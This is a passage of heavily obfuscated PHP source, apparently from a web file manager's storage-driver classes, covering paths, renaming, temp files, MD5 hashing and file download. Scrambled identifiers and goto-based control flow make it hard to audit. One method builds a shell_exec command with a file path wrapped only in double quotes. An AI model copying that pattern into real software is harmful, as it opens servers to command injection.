D–»ÁÊ×°õ: $B¶Â‡õÈ¶Ó =& $_SERVER[Î¿—”òá]; $d°‰Æ§àÕ = IO::info($this->pathParse[$B¶Â‡õÈ¶Ó[75]]); if (!$d°‰Æ§àÕ) { return array(); } goto D´©Ñğí›†; D´©Ñğí›†: $c°ãÜ‘‹Ğ¾ = $this->model->listAll($c‘ƒ¹ÃÖÕë); $C—Ò©«ÔË¢ = Model($B¶Â‡õÈ¶Ó[536])->getInfo($d°‰Æ§àÕ[$B¶Â‡õÈ¶Ó[441]]); $BÊ’²½—…‚ = Action($B¶Â‡õÈ¶Ó[1117]); goto eàğòšºôÁ; eàğòšºôÁ: foreach ($c°ãÜ‘‹Ğ¾ as &$dà¨µŠ“‚) { check_abort(); $dà¨µŠ“‚[$B¶Â‡õÈ¶Ó[391]] = $BÊ’²½—…‚->_shareItemeParse($dà¨µŠ“‚[$B¶Â‡õÈ¶Ó[391]], $C—Ò©«ÔË¢); } return $c°ãÜ‘‹Ğ¾; goto a—¹—¸›íº; a—¹—¸›íº: } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($Cõ´òøĞ±ò) { $this->pathParse = $Cõ´òøĞ±ò; $this->model = Model($_SERVER[Î¿—”òá][1110]); } protected function infoParse($dÔ«ÇÕ¾†, $DÔÖ“Á§â = false, $b‰¿ìâË› = false) { $dïÂ—âêêæ =& $_SERVER[Î¿—”òá]; return Action($dïÂ—âêêæ[1011])->sharePathInfo($this->pathParse[$dïÂ—âêêæ[75]], !0); } public function listPath($fñ–îò¡ƒÒ, $a¬áãÕë×Ë = false) { $d®™”È±±è =& $_SERVER[Î¿—”òá]; $Aó‚°…–Ûé = parent::listPath($fñ–îò¡ƒÒ, $a¬áãÕë×Ë); foreach ($Aó‚°…–Ûé as $E©µ¾•‚ÀÛ => $c×ˆØê—‘†) { if (!in_array($E©µ¾•‚ÀÛ, array($d®™”È±±è[73], $d®™”È±±è[74]))) { continue; } foreach ($c×ˆØê—‘† as $D›ÑŒø´˜ => $CÔ³Õ¦£¸) { $Aó‚°…–Ûé[$E©µ¾•‚ÀÛ][$D›ÑŒø´˜] = Action($d®™”È±±è[1011])->shareItemInfo($CÔ³Õ¦£¸); } } return $Aó‚°…–Ûé; } public function listAll($e„ÆæéË ¾) { $b´¹§¹¿à =& $_SERVER[Î¿—”òá]; $EÌ¡¹ù‰à³ = IO::info($this->pathParse[$b´¹§¹¿à[75]]); if (!$EÌ¡¹ù‰à³) { return array(); } $F­•ñà‚ƒ = $this->model->listAll($e„ÆæéË ¾); foreach ($F­•ñà‚ƒ as &$DŸïÉ©ËÑ–) { $DŸïÉ©ËÑ–[$b´¹§¹¿à[391]] = Action($b´¹§¹¿à[1011])->shareItemInfo($DŸïÉ©ËÑ–[$b´¹§¹¿à[391]]); } return $F­•ñà‚ƒ; } } goto a‡µâ¦òÁ­; F×ŠØÛîÀ: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public function __construct() { $eãÍàÑ”’ =& $_SERVER[Î¿—”òá]; $this->objectDriver = array($eãÍàÑ”’[57], $eãÍàÑ”’[58], $eãÍàÑ”’[59], $eãÍàÑ”’[60], $eãÍàÑ”’[61], $eãÍàÑ”’[62], $eãÍàÑ”’[63], $eãÍàÑ”’[64]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($E¸Ú’µß½) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($E¸Ú’µß½, $_SERVER[Î¿—”òá][8]); } return $E¸Ú’µß½; } public function getPathName($a¢±­êë«¡) { return $a¢±­êë«¡; } public function iconvApp($BˆìÕ—·à‹) { return $BˆìÕ—·à‹; } public function iconvSystem($Fˆ³¾´Õ™§) { return $Fˆ³¾´Õ™§; } public function iconvTo($f‘Û±³¹Åß, $Dßì¼Ö¢³Æ, $C”É±Ôì×) { goto CøÊ°íƒÓå; e·í‰®—œø: $E†„“¶©ä„ = $E†„“¶©ä„ ? $E†„“¶©ä„ : $f‘Û±³¹Åß; if (strstr($E†„“¶©ä„, $bÔàÌ‹’òË[69])) { $E†„“¶©ä„ = str_replace($bÔàÌ‹’òË[69], $bÔàÌ‹’òË[70], $E†„“¶©ä„); } $bßŒ»ç³·Ö[$Dßì¼Ö¢³Æ . $bÔàÌ‹’òË[66] . $C”É±Ôì× . $bÔàÌ‹’òË[67] . $f‘Û±³¹Åß] = $E†„“¶©ä„; goto c—óÕÂ‰í; E®î­Ï–«‡: return $E†„“¶©ä„; goto fÚœ‡õùŸç; CøÊ°íƒÓå: $bÔàÌ‹’òË =& $_SERVER[Î¿—”òá]; if (!$f‘Û±³¹Åß || !function_exists($bÔàÌ‹’òË[65])) { return $f‘Û±³¹Åß; } static $bßŒ»ç³·Ö = array(); goto CŸÖ®Œ¼¤œ; CŸÖ®Œ¼¤œ: $C·»æã“¥º = $Dßì¼Ö¢³Æ . $bÔàÌ‹’òË[66] . $C”É±Ôì× . $bÔàÌ‹’òË[67] . $f‘Û±³¹Åß; if (isset($bßŒ»ç³·Ö[$C·»æã“¥º])) { return $bßŒ»ç³·Ö[$C·»æã“¥º]; } if (function_exists($bÔàÌ‹’òË[68])) { $E†„“¶©ä„ = @mb_convert_encoding($f‘Û±³¹Åß, $C”É±Ôì×, $Dßì¼Ö¢³Æ); } else { $E†„“¶©ä„ = @iconv($Dßì¼Ö¢³Æ, $C”É±Ôì×, $f‘Û±³¹Åß); } goto e·í‰®—œø; c—óÕÂ‰í: $bßŒ»ç³·Ö[$C”É±Ôì× . $bÔàÌ‹’òË[66] . $Dßì¼Ö¢³Æ . $bÔàÌ‹’òË[67] . $f‘Û±³¹Åß] = $f‘Û±³¹Åß; $bßŒ»ç³·Ö[$C”É±Ôì× . $bÔàÌ‹’òË[66] . $Dßì¼Ö¢³Æ . $bÔàÌ‹’òË[67] . $E†„“¶©ä„] = $f‘Û±³¹Åß; $bßŒ»ç³·Ö[$Dßì¼Ö¢³Æ . $bÔàÌ‹’òË[66] . $C”É±Ôì× . $bÔàÌ‹’òË[67] . $E†„“¶©ä„] = $E†„“¶©ä„; goto E®î­Ï–«‡; fÚœ‡õùŸç: } public function getPathInner($DŸóÈâ„) { $F²ØëÜƒ„ƒ = IO::init($DŸóÈâ„); return $F²ØëÜƒ„ƒ->path; } public function getPathOuter($bôÏÉÖ›¥ˆ) { $C¸ŠŠ„—©š =& $_SERVER[Î¿—”òá]; $d¹ï«áŸŠ = strlen(trim($this->pathBase, $C¸ŠŠ„—©š[8])); $bôÏÉÖ›¥ˆ = substr(trim($bôÏÉÖ›¥ˆ, $C¸ŠŠ„—©š[8]), $d¹ï«áŸŠ); return $this->pathDriver . $C¸ŠŠ„—©š[8] . ltrim($bôÏÉÖ›¥ˆ, $C¸ŠŠ„—©š[8]); } public function isParentOf($bˆ®œÓîå”, $aÇˆÌ‚ ¯) { $E—ß¾é¶Û› =& $_SERVER[Î¿—”òá]; $bˆ®œÓîå” = rtrim(strtolower($bˆ®œÓîå”), $E—ß¾é¶Û›[8]) . $E—ß¾é¶Û›[8]; $aÇˆÌ‚ ¯ = rtrim(strtolower($aÇˆÌ‚ ¯), $E—ß¾é¶Û›[8]) . $E—ß¾é¶Û›[8]; $c¿Ô£ºŠà = strpos($aÇˆÌ‚ ¯, $bˆ®œÓîå”) === 0; return $c¿Ô£ºŠà; } public function getType() { $Añâ¸¹éŠÉ =& $_SERVER[Î¿—”òá]; $FŒâ’ØºŸÜ = str_replace($Añâ¸¹éŠÉ[71], $Añâ¸¹éŠÉ[33], get_class($this)); return strtolower($FŒâ’ØºŸÜ); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($CöŞˆ…çÉ’, $bÕ±”‹íÏ) { $aé°šÏÊÀŒ =& $_SERVER[Î¿—”òá]; $EÛ·£œÙò„ = rtrim($CöŞˆ…çÉ’, $aé°šÏÊÀŒ[8]) . $aé°šÏÊÀŒ[8] . $bÕ±”‹íÏ; $a‡Ç¥–İŒæ = $this->exist($EÛ·£œÙò„); return $a‡Ç¥–İŒæ ? $EÛ·£œÙò„ : !1; } public function setModifyTime($fĞ“¥‰±´¸, $FØ›ò§ÑÒ« = '') { } public function renameObject($FŸª¨ªˆ», $bà‡ÜÄ¼ŞĞ) { goto Eì¢æíùõ…; Eì¢æíùõ…: $c–ÆÍ¢‡Ìà =& $_SERVER[Î¿—”òá]; $F“ğù¡ÏŒÑ = $bà‡ÜÄ¼ŞĞ; Hook::trigger($c–ÆÍ¢‡Ìà[72], $this, $FŸª¨ªˆ», $this, $this->pathFather($FŸª¨ªˆ») . $bà‡ÜÄ¼ŞĞ); goto eõÕ»´«ê; eõÕ»´«ê: $FŸª¨ªˆ» = $this->getPathOuter($FŸª¨ªˆ»); $bà‡ÜÄ¼ŞĞ = $this->pathFather($FŸª¨ªˆ») . $bà‡ÜÄ¼ŞĞ; if (IO::isFile($FŸª¨ªˆ»)) { $BˆÎ±ğ¬Â™ = IO::copy($FŸª¨ªˆ», $this->pathFather($FŸª¨ªˆ»), REPEAT_RENAME_FOLDER, $F“ğù¡ÏŒÑ); if ($BˆÎ±ğ¬Â™) { IO::remove($FŸª¨ªˆ»); } } else { $BˆÎ±ğ¬Â™ = IO::mkdir($bà‡ÜÄ¼ŞĞ); if (!$BˆÎ±ğ¬Â™) { return !1; } $B£¤èÍÄØ¤ = IO::listPath($FŸª¨ªˆ», !0); $Fæœ˜šÖø = array_merge($B£¤èÍÄØ¤[$c–ÆÍ¢‡Ìà[73]], $B£¤èÍÄØ¤[$c–ÆÍ¢‡Ìà[74]]); foreach ($Fæœ˜šÖø as $c¼Ã®¯Í½î) { IO::move($c¼Ã®¯Í½î[$c–ÆÍ¢‡Ìà[75]], $bà‡ÜÄ¼ŞĞ, REPEAT_RENAME_FOLDER); } IO::remove($FŸª¨ªˆ»); } goto Aê´£Ñò†Ì; Aê´£Ñò†Ì: return $BˆÎ±ğ¬Â™ ? $bà‡ÜÄ¼ŞĞ : !1; goto E»¨¼¿¿Œš; E»¨¼¿¿Œš: } public function tempFile($FŒò¹£Ÿî = '', $d“ó·Á¯¥â = '') { goto EÁğÆƒ´É; A¨À°ƒÙÏœ: $E‹ÈÏÏÆÇ‡ = $A»‚÷–Ó¬ . $FŒò¹£Ÿî; @touch($E‹ÈÏÏÆÇ‡); if ($d“ó·Á¯¥â) { file_put_contents($E‹ÈÏÏÆÇ‡, $d“ó·Á¯¥â); } goto fÊÏ°õèœ; fÊÏ°õèœ: return $E‹ÈÏÏÆÇ‡; goto B‰Â„¤«ÈÇ; EÁğÆƒ´É: if (!$FŒò¹£Ÿî) { $FŒò¹£Ÿî = rand_string(15); } $A»‚÷–Ó¬ = TEMP_FILES . rand_string(15) . $_SERVER[Î¿—”òá][8]; @mkdir($A»‚÷–Ó¬, 511, !0); goto A¨À°ƒÙÏœ; B‰Â„¤«ÈÇ: } public function tempFileRemve($e…Û²œ«ˆğ) { @unlink($e…Û²œ«ˆğ); @rmdir($this->pathFather($e…Û²œ«ˆğ)); } public function mkfile($cùÏ…ÉĞâ¾, $dìİÖ¥ñ‹Ã = '', $d¢¾’óô = REPEAT_RENAME) { } public function mkdir($AÓä‚İƒ¦‰, $aÑçÕï´ = REPEAT_SKIP) { } public function delFile($c µæ¬µ) { } public function delFolder($A‹ï’š‹è) { } public function copyFile($B¶·¢´Ùƒ, $D©–š¥õõ”) { } public function moveFile($fÒè•›Àí, $CºÜˆğö•Ç) { } public function remove($b£áÅ‡ ÷†) { if ($this->isFile($b£áÅ‡ ÷†)) { return $this->delFile($b£áÅ‡ ÷†); } return $this->delFolder($b£áÅ‡ ÷†); } public function rename($C†‚óˆó–, $EĞßÊÅ£Ò‡) { } public function exist($eëò£ õ¢Ñ) { } public function findByHash($fÜë–ê„µĞ = '', $EÈŞÓÍĞÒ‰ = '') { return !1; } public function isFile($f¾µŞùÜ«ƒ) { } public function isFolder($D¯Ò¡¿³éº) { } public function size($Eóñ¥Ê×™‡) { } public function info($C¼ğ¡ÑÃ—) { } public function infoSimple($AÍˆ«­õÉï) { return $this->info($AÍˆ«­õÉï); } public function infoAuth($bÎğ´Ã‰«º) { return $this->info($bÎğ´Ã‰«º); } public function infoFull($dèò‚…ª—¬) { return $this->info($dèò‚…ª—¬); } public function infoWithChildren($BÚóÍò¼è·) { $bËÂš‹–Ñ =& $_SERVER[Î¿—”òá]; static $bÏ£™§Ù“ñ = array(); if (isset($bÏ£™§Ù“ñ[$BÚóÍò¼è·])) { return $bÏ£™§Ù“ñ[$BÚóÍò¼è·]; } $FóÃÔŒ…Ş = $this->info($BÚóÍò¼è·); if ($FóÃÔŒ…Ş && $FóÃÔŒ…Ş[$bËÂš‹–Ñ[29]] == $bËÂš‹–Ñ[76]) { $Aƒó¥é”à = array($bËÂš‹–Ñ[77] => 0, $bËÂš‹–Ñ[78] => 0, $bËÂš‹–Ñ[79] => 0); $this->infoChildren($BÚóÍò¼è·, $Aƒó¥é”à); $FóÃÔŒ…Ş[$bËÂš‹–Ñ[77]] = $Aƒó¥é”à[$bËÂš‹–Ñ[77]]; $FóÃÔŒ…Ş[$bËÂš‹–Ñ[80]] = array($bËÂš‹–Ñ[81] => $Aƒó¥é”à[$bËÂš‹–Ñ[78]], $bËÂš‹–Ñ[82] => $Aƒó¥é”à[$bËÂš‹–Ñ[79]]); $bÏ£™§Ù“ñ[$BÚóÍò¼è·] = $FóÃÔŒ…Ş; } return $FóÃÔŒ…Ş; } public function listPath($A§½²¾õğŠ, $D“„±ã—« = false) { } public function has($A¶ÉßØëõ®, $e–‘œáœÈÑ = false, $BÌÊôÏÈ—À = false) { } public function canRead($A¥ääŠ„…) { } public function canWrite($E—ºÙ‡…Ñº) { } public function getContent($aÇ°õÀ…ˆ„) { } public function setContent($Fˆ‰à‹¿Ç–, $E¿åÔ“†ó¥ = '') { } protected function infoChildren($DÄÚ†‰á·Ì, &$EÙÈÃ¹ˆØ) { $A—£ÓÀğÃ =& $_SERVER[Î¿—”òá]; check_abort(); $bœÌ»³óãğ = $this->listPath($DÄÚ†‰á·Ì, !0); $bœÌ»³óãğ = array_merge($bœÌ»³óãğ[$A—£ÓÀğÃ[74]], $bœÌ»³óãğ[$A—£ÓÀğÃ[73]]); foreach ($bœÌ»³óãğ as $fùå‹ÓŠ÷Ì) { if ($fùå‹ÓŠ÷Ì[$A—£ÓÀğÃ[29]] == $A—£ÓÀğÃ[76]) { $EÙÈÃ¹ˆØ[$A—£ÓÀğÃ[79]]++; $D·À¬ØÇ‘¬ = $this->getPathInner($fùå‹ÓŠ÷Ì[$A—£ÓÀğÃ[75]]); $this->infoChildren($D·À¬ØÇ‘¬, $EÙÈÃ¹ˆØ); } else { $EÙÈÃ¹ˆØ[$A—£ÓÀğÃ[78]]++; $EÙÈÃ¹ˆØ[$A—£ÓÀğÃ[77]] += $fùå‹ÓŠ÷Ì[$A—£ÓÀğÃ[77]]; } } } public function fileSubstr($bÈß©Ô´Á‚, $b‘Ç×Š”«, $eõ¬»¤—§à) { } public function listAll($F”Ä©é¦) { } public function upload($fÉç´çóß…, $F©×âˆ¾Ğ, $C¿Éè”âÑ• = false, $e¯£»éˆïŒ = REPEAT_REPLACE) { } public function uploadFileByID($aãè»™Ğøô, $BÜ¦ ¼ƒ„Ì, $Cñ…Ö…Ÿ¦ß) { } public function uploadFileByPath($A÷˜ÃŠ§İ, $EîùùÍËÏÕ, $føÄõ»Æ× = array()) { } public function isUploadServer() { $d‹“Ïğ±ø  =& $_SERVER[Î¿—”òá]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $d‹“Ïğ±ø [83]) { return !0; } return $GLOBALS[$d‹“Ïğ±ø [6]][$d‹“Ïğ±ø [84]][$d‹“Ïğ±ø [85]]; } public function isFileOutServer() { $e¡¨Û–ÜŒÉ =& $_SERVER[Î¿—”òá]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $e¡¨Û–ÜŒÉ[83]) { return !0; } return $GLOBALS[$e¡¨Û–ÜŒÉ[6]][$e¡¨Û–ÜŒÉ[84]][$e¡¨Û–ÜŒÉ[86]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($fœÂ‚Ö”è±) { $C°É×›¦’Ô =& $_SERVER[Î¿—”òá]; if (!$this->isCdnHost()) { return $fœÂ‚Ö”è±; } return str_replace(trim(get_url_root($fœÂ‚Ö”è±), $C°É×›¦’Ô[8]), trim($this->cdnHost, $C°É×›¦’Ô[8]), $fœÂ‚Ö”è±); } public function uploadLink($d ’¼††¥, $c¶©Æîœ‰‚ = 0) { goto aÍ¾Ş©©Ã ; c¡…²ø­ğ: if ($b°×ÌòáŠ”) { $b°×ÌòáŠ”[$f›µŒ‹Ó[89]] = $d ’¼††¥; $b°×ÌòáŠ”[$f›µŒ‹Ó[90]] = $eğ…ÜÔÌŸ; } return $b°×ÌòáŠ”; goto f¦¼‹ÆÄí«; F”ŠÓø±ù‚: $d’®ÌÙ£ôÁ = $c¶©Æîœ‰‚ <= $eØ²çß­ã” ? $f›µŒ‹Ó[87] : $f›µŒ‹Ó[88]; $f¼ôÃÔ„Ö = (!$c¶©Æîœ‰‚ ? 1 : ceil($c¶©Æîœ‰‚ / pow(1024, 3))) * 3600 * 4; $b°×ÌòáŠ” = $this->{$d’®ÌÙ£ôÁ}($d ’¼††¥, $f¼ôÃÔ„Ö); goto c¡…²ø­ğ; f…öÂğ·ö‹: if (!in_array($eğ…ÜÔÌŸ, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $eØ²çß­ã” = 1024 * 1024 * 10; goto F”ŠÓø±ù‚; aÍ¾Ş©©Ã : $f›µŒ‹Ó =& $_SERVER[Î¿—”òá]; if ($this->isUploadServer()) { return; } $eğ…ÜÔÌŸ = $this->getType(); goto f…öÂğ·ö‹; f¦¼‹ÆÄí«: } public function uploadFormData($BÂ¾Šƒ¤âø, $FŞö‘ÇÀÅ = 3600) { } public function multiUploadFormData($CéŒ¹”ªÂ“, $fé°¦Èö¢ = 3600) { } public function download($Fˆ¾Ú¹©ê, $A‰±ÊÑ¬Ê…) { } public function ext($a¨½ÕÍÅƒ) { $e¹ËÍÒµÀ¾ =& $_SERVER[Î¿—”òá]; if (strpos($a¨½ÕÍÅƒ, $e¹ËÍÒµÀ¾[8]) === -1) { $E†¦÷ãïôá = $a¨½ÕÍÅƒ; } else { $E†¦÷ãïôá = $this->pathThis($a¨½ÕÍÅƒ); } $fÍø«±äˆè = $e¹ËÍÒµÀ¾[33]; if (strstr($E†¦÷ãïôá, $e¹ËÍÒµÀ¾[91])) { $fÍø«±äˆè = substr($E†¦÷ãïôá, strrpos($E†¦÷ãïôá, $e¹ËÍÒµÀ¾[91]) + 1); $fÍø«±äˆè = strtolower($fÍø«±äˆè); } if (strlen($fÍø«±äˆè) > 3 && preg_match($e¹ËÍÒµÀ¾[92], $fÍø«±äˆè, $dŞùßºáŠ)) { $fÍø«±äˆè = $e¹ËÍÒµÀ¾[33]; } return $fÍø«±äˆè; } public function pathThis($dğŠ÷²²ø) { $fã›®¨óœ =& $_SERVER[Î¿—”òá]; $dğŠ÷²²ø = str_replace($fã›®¨óœ[93], $fã›®¨óœ[8], rtrim($dğŠ÷²²ø, $fã›®¨óœ[8])); $c‹Ù¦ªË ¢ = strrpos($dğŠ÷²²ø, $fã›®¨óœ[8]); if ($c‹Ù¦ªË ¢ === !1) { return $dğŠ÷²²ø; } return substr($dğŠ÷²²ø, $c‹Ù¦ªË ¢ + 1); } public function pathFather($B‚Ë——Ç³˜) { $bË¯«¿»Ú =& $_SERVER[Î¿—”òá]; $B‚Ë——Ç³˜ = str_replace($bË¯«¿»Ú[93], $bË¯«¿»Ú[8], rtrim($B‚Ë——Ç³˜, $bË¯«¿»Ú[8])); $Dá¢ø‰í‚ = strrpos($B‚Ë——Ç³˜, $bË¯«¿»Ú[8]); if ($Dá¢ø‰í‚ === !1) { return $bË¯«¿»Ú[33]; } return substr($B‚Ë——Ç³˜, 0, $Dá¢ø‰í‚ + 1); } public function hashSimple($e‚”‘ŒÚ—) { goto cŞãŠòÚ±‡; cŞãŠòÚ±‡: $dœŸ£ÃÜ×¾ =& $_SERVER[Î¿—”òá]; if (!$e‚”‘ŒÚ—) { return md5($dœŸ£ÃÜ×¾[33]); } $DÙ½½Æ×“Œ = $this->size($e‚”‘ŒÚ—); goto bà‰ñÄÃŸñ; d²¡¿¶ç•ß: $B»¢µÄŠØ› = intval($DÙ½½Æ×“Œ / $EŸ¡“ÅîÏŞ); $AÆº»®³â = $dœŸ£ÃÜ×¾[33]; for ($c²ÆÜë¯È = 0; $c²ÆÜë¯È < $EŸ¡“ÅîÏŞ; $c²ÆÜë¯È++) { $AÆº»®³â .= $this->fileSubstr($e‚”‘ŒÚ—, $B»¢µÄŠØ› * $c²ÆÜë¯È, $DË¬‰•®´Ì); } goto F—®©²ó¥‹; bà‰ñÄÃŸñ: $DË¬‰•®´Ì = 200; $EŸ¡“ÅîÏŞ = 50; if ($DÙ½½Æ×“Œ <= $DË¬‰•®´Ì * $EŸ¡“ÅîÏŞ) { return $this->hashMd5($e‚”‘ŒÚ—) . $DÙ½½Æ×“Œ; } goto d²¡¿¶ç•ß; F—®©²ó¥‹: $AÆº»®³â .= $this->fileSubstr($e‚”‘ŒÚ—, $DÙ½½Æ×“Œ - $DË¬‰•®´Ì, $DË¬‰•®´Ì); return md5($AÆº»®³â) . $DÙ½½Æ×“Œ; goto aø³Ù¿“Ê; aø³Ù¿“Ê: } public static $md5Cache = array(); public function hashMd5($c©Ÿ­Œã¼) { $c©Ÿ­Œã¼ = $this->iconvSystem($c©Ÿ­Œã¼); if (isset(self::$md5Cache[$c©Ÿ­Œã¼])) { return self::$md5Cache[$c©Ÿ­Œã¼]; } self::$md5Cache[$c©Ÿ­Œã¼] = $this->hashMd5Shell($c©Ÿ­Œã¼); if (!self::$md5Cache[$c©Ÿ­Œã¼]) { self::$md5Cache[$c©Ÿ­Œã¼] = @md5_file($c©Ÿ­Œã¼); } return self::$md5Cache[$c©Ÿ­Œã¼]; } private function hashMd5Shell($f³±‚Úé»‰) { goto c¥ÏˆÛÂñŞ; Aé¼‰Ì¬ì: $bœÁ„”Ø¹Ê = shell_exec($d•¶¨Äçñ¢ . "\40\x22{$f³±‚Úé»‰}\42"); $bœÁ„”Ø¹Ê = str_replace($CÌ‡Ô¦†ö[100], $CÌ‡Ô¦†ö[33], $bœÁ„”Ø¹Ê); return substr($bœÁ„”Ø¹Ê, 0, 32); goto bÖ³íò§‡; c¥ÏˆÛÂñŞ: $CÌ‡Ô¦†ö =& $_SERVER[Î¿—”òá]; if (!function_exists($CÌ‡Ô¦†ö[94])) { return !1; } $a¯»ãñŸ› = array($CÌ‡Ô¦†ö[95], $CÌ‡Ô¦†ö[96]); goto BœÑÎ’…®°; BœÑÎ’…®°: $d•¶¨Äçñ¢ = Cache::get($CÌ‡Ô¦†ö[97]); if (!$d•¶¨Äçñ¢) { $cÈç¢İóÔ = BASIC_PATH . $CÌ‡Ô¦†ö[98]; $c¬îĞÙòÎâ = md5_file($cÈç¢İóÔ); $d•¶¨Äçñ¢ = $CÌ‡Ô¦†ö[99]; foreach ($a¯»ãñŸ› as $CàÛ’À¸…Ú) { $bœÁ„”Ø¹Ê = shell_exec($CàÛ’À¸…Ú . "\x20\x22{$cÈç¢İóÔ}\42"); if ($bœÁ„”Ø¹Ê && substr(trim($bœÁ„”Ø¹Ê), 0, 32) == $c¬îĞÙòÎâ) { $d•¶¨Äçñ¢ = $CàÛ’À¸…Ú; break; } } Cache::set($CÌ‡Ô¦†ö[97], $d•¶¨Äçñ¢, 3600); } if ($d•¶¨Äçñ¢ == $CÌ‡Ô¦†ö[99]) { return !1; } goto Aé¼‰Ì¬ì; bÖ³íò§‡: } public function link($FäšµóÂ) { return $FäšµóÂ; } public function fileOut($f¾¹ë°•ŠÎ, $eÔ‡‚Èãë = false, $eÓ´•÷ÁÜß = false, $fÏ¸òö Šò = '') { goto aóØÚ‰Œ‰; Eâœ‹Ú½Š¾: $FõÚâòä¦ = strtolower($_SERVER[$Bõ»¡¦æà[139]]); if ($Eèšé¡öº && $FõÚâòä¦ && $F“‡õİ„Æ) { if (strstr($FõÚâòä¦, $Bõ»¡¦æà[140])) { header($Bõ»¡¦æà[141] . $f¾¹ë°•ŠÎ); } else { if (strstr($FõÚâòä¦, $Bõ»¡¦æà[142])) { header($Bõ»¡¦æà[143] . $f¾¹ë°•ŠÎ); } else { if (strstr($FõÚâòä¦, $Bõ»¡¦æà[144])) { header($Bõ»¡¦æà[145] . $f¾¹ë°•ŠÎ); } } } if ($D¨”–š­³) { header($Bõ»¡¦æà[146] . $D¨”–š­³); } return; } if (isset($_SERVER[$Bõ»¡¦æà[147]])) { if (preg_match($Bõ»¡¦æà[148], $_SERVER[$Bõ»¡¦æà[147]], $eÆ±ˆ¢ã™‰)) { $B»¦ÉÊ‹ˆ® = intval($eÆ±ˆ¢ã™‰[1]); if (!empty($eÆ±ˆ¢ã™‰[2])) { $A²³²Ò“¸‚ = intval($eÆ±ˆ¢ã™‰[2]); } } header($Bõ»¡¦æà[149]); header("\x43\157\156\164\x65\156\x74\55\122\x61\x6e\x67\x65\72\x20\142\x79\164\x65\163\x20{$B»¦ÉÊ‹ˆ®}\x2d{$A²³²Ò“¸‚}\57" . $dï°ã’¹¸); } else { header($Bõ»¡¦æà[150]); } goto fñ¿ÇÓøÍ¥; C ‰¨»â‘: header($Bõ»¡¦æà[135] . $dï°ã’¹¸); header($Bõ»¡¦æà[136]); if (!$eÔ‡‚Èãë && $B÷Â¥†Û£œ == $Bõ»¡¦æà[137]) { if ($dï°ã’¹¸ > 1024 * 1024 * 5) { die; } $d°¶¶‘î´¥ = $this->getContent($f¾¹ë°•ŠÎ); $d°¶¶‘î´¥ = Html::clearSVG($d°¶¶‘î´¥); header($Bõ»¡¦æà[138] . $dï°ã’¹¸); echo $d°¶¶‘î´¥; die; } goto Eâœ‹Ú½Š¾; FñÈ¤Å­Û°: if (in_array($B÷Â¥†Û£œ, array($Bõ»¡¦æà[108], $Bõ»¡¦æà[109], $Bõ»¡¦æà[110], $Bõ»¡¦æà[111]))) { $B÷Â¥†Û£œ = $Bõ»¡¦æà[112]; } if (!$fÏ¸òö Šò) { $fÏ¸òö Šò = md5($D£¢°¨±¤² . $this->hashSimple($f¾¹ë°•ŠÎ)); } $fÏ¸òö Šò = $Bõ»¡¦æà[113] . $fÏ¸òö Šò . $Bõ»¡¦æà[113]; goto a÷–ğŞÁ­Ù; CÖêñÑàµ: header($Bõ»¡¦æà[132] . $D£¢°¨±¤² . $Bõ»¡¦æà[124]); header($Bõ»¡¦æà[133] . $Dª©‚ò§ÄÆ); header($Bõ»¡¦æà[134]); goto C ‰¨»â‘; aóØÚ‰Œ‰: $Bõ»¡¦æà =& $_SERVER[Î¿—”òá]; $this->cacheMethod(null, null); if (!$f¾¹ë°•ŠÎ || !$this->exist($f¾¹ë°•ŠÎ)) { show_json(LNG($Bõ»¡¦æà[101]), !1, $eÓ´•÷ÁÜß); } goto eî¡¢Ó°î; F‚÷ØÂòÚÕ: @ob_end_clean(); set_timeout(); $a¥Èµ–±„Ô = $this->infoFull($f¾¹ë°•ŠÎ); goto F¶ÏÜãã‹…; a÷–ğŞÁ­Ù: $bö¢’ÈÓã« = get_file_mime($B÷Â¥†Û£œ); if (strstr($bö¢’ÈÓã«, $Bõ»¡¦æà[114])) { $bö¢’ÈÓã« = $bö¢’ÈÓã« . $Bõ»¡¦æà[115]; } if ($eÔ‡‚Èãë === !1 && !mime_support($bö¢’ÈÓã«)) { $eÔ‡‚Èãë = !0; $bö¢’ÈÓã« = $Bõ»¡¦æà[116]; } goto b‚°ÏİÔÃ·; cœ¶­ˆ¤‚¤: if (isset($_SERVER[$Bõ»¡¦æà[128]]) && strtotime($_SERVER[$Bõ»¡¦æà[128]]) == $a¥Èµ–±„Ô[$Bõ»¡¦æà[107]]) { header($Bõ»¡¦æà[129], !0, 304); die; } if (isset($_SERVER[$Bõ»¡¦æà[130]]) && $_SERVER[$Bõ»¡¦æà[130]] == $fÏ¸òö Šò) { header($Bõ»¡¦æà[131] . $fÏ¸òö Šò, !0, 304); die; } header($Bõ»¡¦æà[131] . $fÏ¸òö Šò); goto CÖêñÑàµ; fñ¿ÇÓøÍ¥: $c£ÛßµîŒ = !0; if ($_SERVER[$Bõ»¡¦æà[151]] == $Bõ»¡¦æà[152] && $dï°ã’¹¸ > 1204 * 1024 * 1024 * 2) { $c£ÛßµîŒ = !1; } if ($c£ÛßµîŒ) { header($Bõ»¡¦æà[153] . ($A²³²Ò“¸‚ - $B»¦ÉÊ‹ˆ® + 1)); } goto C§ÕÄ®óõ†; E‚•ÍõÙ»: header($Bõ»¡¦æà[121]); header($Bõ»¡¦æà[122] . $bö¢’ÈÓã«); header($Bõ»¡¦æà[123] . gmdate($Bõ»¡¦æà[106], time() + 3600 * 24 * 30) . $Bõ»¡¦æà[124]); goto dĞ¶ÈáÍåŸ; Bé‹Û÷ÍÉÍ: if ($D¨”–š­³) { $D‡àšÂ¡” = intval(1000 * 1000 * ($b·î¦°Ë»š / $D¨”–š­³)); } while ($B»¦ÉÊ‹ˆ® <= $A²³²Ò“¸‚) { $f…È»ĞçÔ = timeFloat(); check_abort(); $fõÔò‹‘ìË = $A²³²Ò“¸‚ - $B»¦ÉÊ‹ˆ® + 1; if ($fõÔò‹‘ìË <= $b·î¦°Ë»š) { $b·î¦°Ë»š = $fõÔò‹‘ìË; } echo $this->fileSubstr($f¾¹ë°•ŠÎ, $B»¦ÉÊ‹ˆ®, $b·î¦°Ë»š); 